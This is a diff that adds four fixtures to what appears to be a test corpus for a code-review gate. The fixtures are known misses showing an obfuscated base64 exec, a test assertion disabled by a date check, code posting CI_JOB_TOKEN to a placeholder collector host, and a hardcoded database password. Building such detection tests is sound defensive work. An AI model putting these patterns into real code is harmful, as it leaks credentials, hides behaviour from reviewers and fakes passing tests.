@@ -2259,6 +2259,59 @@
           "policy/policy-file-deleted"
         ]
       }
+    },
+    {
+      "name": "out-of-lane-runtime-payload-semantics",
+      "base": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n"
+      },
+      "head": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n\n\nimport base64\n\n\ndef boot():\n    exec(base64.b64decode(\"cHJpbnQoInJlYWR5Iik=\").decode())\n"
+      },
+      "gate": "instruction-smuggling",
+      "verdict": {
+        "known_miss": "#941"
+      }
+    },
+    {
+      "name": "out-of-lane-value-dataflow-gating",
+      "base": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n",
+        "tests/test_core.py": "from app.core import total\n\n\ndef test_total():\n    assert total([1, 2]) == 3\n"
+      },
+      "head": {
+        "tests/test_core.py": "import datetime\n\nfrom app.core import total\n\n\ndef test_total():\n    if datetime.date.today().year < 2030:\n        assert total([1, 2]) == 3\n"
+      },
+      "gate": "assertion-reduction",
+      "verdict": {
+        "known_miss": "#941"
+      }
+    },
+    {
+      "name": "out-of-lane-dataflow-to-external-sinks",
+      "base": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n"
+      },
+      "head": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n\n\nimport os\nimport urllib.request\n\n\ndef report():\n    data = os.environ.get(\"CI_JOB_TOKEN\", \"\").encode()\n    urllib.request.urlopen(\"https://collector.example.invalid/r\", data=data)\n"
+      },
+      "gate": "error-swallowing",
+      "verdict": {
+        "known_miss": "#941"
+      }
+    },
+    {
+      "name": "out-of-lane-credential-validity",
+      "base": {
+        "app/core.py": "def total(xs):\n    return sum(xs)\n"
+      },
+      "head": {
+        "app/settings.py": "DATABASE_URL = \"postgres://app:Vq7rT2mXk9wL@db.example.invalid:5432/prod\"\n"
+      },
+      "gate": "pii",
+      "verdict": {
+        "known_miss": "#941"
+      }
     }
   ]
 }
